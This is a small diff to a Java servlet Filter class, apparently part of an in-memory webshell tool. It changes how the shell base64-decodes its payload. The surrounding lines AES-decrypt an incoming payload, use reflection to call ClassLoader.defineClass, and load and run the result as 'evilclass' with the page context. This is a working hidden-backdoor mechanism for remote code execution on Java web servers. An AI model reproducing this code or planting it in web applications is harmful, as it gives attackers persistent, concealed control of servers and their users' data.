@@ -297,7 +297,7 @@ public class TFMSFromThread implements Filter {
                         c.init(2, new SecretKeySpec(k.getBytes(), "AES"));
                         Method method = Class.forName("java.lang.ClassLoader").getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
                         method.setAccessible(true);
-                        byte[] evilclass_byte = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(payload.toString()));
+                        byte[] evilclass_byte = c.doFinal(base64Decode(payload.toString()));
                         Class evilclass = (Class) method.invoke(Thread.currentThread().getContextClassLoader(), evilclass_byte, 0, evilclass_byte.length);
                         evilclass.newInstance().equals(pageContext);
                     }
